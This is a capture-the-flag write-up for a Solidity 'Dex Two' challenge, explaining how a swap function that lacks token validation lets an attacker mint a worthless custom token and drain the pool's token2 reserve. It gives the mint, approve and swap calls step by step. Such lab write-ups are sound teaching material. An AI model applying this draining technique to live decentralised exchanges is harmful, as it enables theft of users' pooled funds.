# Logic

We can see that now in the `swap` function th condition on the `from` and `to` field was removed, so now we can swap between any tokens.

# Solution

To empty one pool we can use the steps on the first **dex** challenge, see `22. Dex` solution

After we drain a token (if you followed the steps that I did, `token1` balance is empty now in the contract), we can drain the second one.

We deployed a new token, you can see the code at `SwappableTokenTwo.sol`. We added an external `mint` function to mint for ourself and also for the **dex**!!! We could mint for ourself from the constructor, but that will not apply for the dex

So after the deploy, call the `mint` function:
```
mint(<dex_address>, 1);
```

We mint only one token to the dex, to make our job easier on the next calculation. Also, do not forget to mint to your address :) 
```
mint(<my_address>, 1)
```

You will need to approve the contract to move the new funds:
```
approve(<dex_address>, <amount>) // in our case 1
```

And now let's calculate the output amount for the new pair -> Token2 and OurToken.
```
await contract.getSwapAmount(<our_token_address>, await contract.token2(), 1)
```
We can see that the returned value is `90`, the exact amount of the reserve, so by running swap with the same params we will extract all the tokens:

```
await contract.swap(<out_token_address>, await contract.token2(), 1)
```







